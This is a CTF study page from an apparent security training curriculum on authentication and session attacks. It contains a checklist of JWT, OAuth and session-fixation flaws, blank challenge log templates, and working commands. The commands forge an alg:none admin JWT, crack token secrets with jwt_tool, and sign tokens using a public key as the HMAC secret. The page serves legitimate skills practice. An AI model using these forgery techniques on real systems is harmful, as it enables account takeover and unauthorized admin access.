---
title: "CTF Web Competition Day 2 — Authentication and Session Attacks"
tags: [CTF, web, competition, authentication, JWT, session, OAuth, practice, bug-bounty]
module: 05-BugBountyOps-02
day: 312
related_topics:
  - CTF Web Competition Day 1 (Day 311)
  - Authentication Attacks (R-03)
  - JWT Advanced Attacks (Day 169)
---

# Day 312 — CTF Web Competition Day 2: Authentication and Session Attacks

---

## Goals

Target CTF challenges focused on authentication and session management flaws.
Apply JWT attacks, OAuth abuse, session fixation, and broken auth patterns.

**Time budget:** 4–5 hours.

---

## Authentication Attack Checklist

Before testing each challenge, run this checklist mentally:

```
JWT checks:
  [ ] Decode header.payload without verifying (base64 -d)
  [ ] Algorithm: none attack
  [ ] HS256 signed with RS256 public key (alg confusion)
  [ ] Weak secret — crack with jwt_tool or hashcat
  [ ] Key confusion (RS256 → HS256 with public key as secret)
  [ ] JWK injection (add jwk header pointing to attacker-controlled key)
  [ ] KID injection (kid: "../../dev/null" or SQLi in kid)

Session checks:
  [ ] Predictable session token (sequential, base64-encoded username)
  [ ] Session fixation (server accepts pre-set session ID)
  [ ] Session not invalidated on logout
  [ ] Insecure cookie flags (HttpOnly missing → XSS → theft; Secure missing)

OAuth checks:
  [ ] state parameter missing or not validated → CSRF login
  [ ] redirect_uri not validated → steal code/token
  [ ] Response type: token (implicit flow) — token in URL fragment, logged
  [ ] Client secret exposed in JS bundle
  [ ] account takeover via email claim from unverified provider
```

---

## Challenge Log

### Challenge 1 — JWT Target

```
Points:   ___
Observed: JWT in Authorization header / cookie

Decoded header:
  {"alg": "___ ", "typ": "JWT"}

Decoded payload:
  {"sub": "___ ", "role": "___ ", "exp": ___}

Attack used:
  [ ] alg:none
  [ ] HS256/RS256 confusion
  [ ] Weak secret cracked

# jwt_tool usage
python3 jwt_tool.py TOKEN -T  # tamper mode
python3 jwt_tool.py TOKEN -X a  # alg:none
python3 jwt_tool.py TOKEN -C -d wordlist.txt  # crack

Forged payload:
  {"sub": "___ ", "role": "admin", "exp": ___}

Flag: ___
Time: ___ min
```

### Challenge 2 — OAuth / SSO Target

```
Points:   ___
Flow observed: ___  (authorization_code / implicit / device / PKCE)

Weakness:
  [ ] Missing state → CSRF login to attacker account
  [ ] Loose redirect_uri → steal code
  [ ] JWT id_token with weak signature
  [ ] Account linking without email verification

Attack:
  ___

Flag: ___
Time: ___ min
```

### Challenge 3 — Session Fixation / Prediction

```
Points:   ___

Session token format: ___  (Base64 / hex / opaque)
Predictable: Y/N

If predictable:
  - Pattern: ___
  - Script to predict next token: ___

If fixation:
  - Attack: set cookie before login → server reuses it → attacker accesses session

Flag: ___
Time: ___ min
```

---

## JWT Quick Reference (from Memory)

Write the forge steps without looking them up:

```bash
# 1. Decode a JWT
echo "HEADER.PAYLOAD" | base64 -d 2>/dev/null

# 2. alg:none (remove signature)
# New header: {"alg":"none","typ":"JWT"}
# New token: BASE64(header).BASE64(payload).   (empty signature)

HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"sub":"admin","role":"admin"}' | base64 | tr -d '=' | tr '+/' '-_')
echo "$HEADER.$PAYLOAD."

# 3. HS256 with RS256 public key as secret
# Extract public key from /jwks.json or /.well-known/jwks.json
# Sign token HS256 using that public key bytes as the HMAC secret
python3 jwt_tool.py TOKEN -S hs256 -p "PUBLIC_KEY_CONTENT"
```

---

## Session Metrics

```
Challenges attempted: ___
Flags captured:       ___
Authentication bugs found: ___
Most impactful auth bug class today: ___
```

---

## Questions

> Add your questions here. Each question gets a Global ID (Q312.1, Q312.2 …).

---

## Navigation

← Previous: [Day 311 — CTF Web Competition Day 1](DAY-0311-CTF-Web-Competition-Day-01.md)
→ Next: [Day 313 — CTF Web Competition Day 3](DAY-0313-CTF-Web-Competition-Day-03.md)
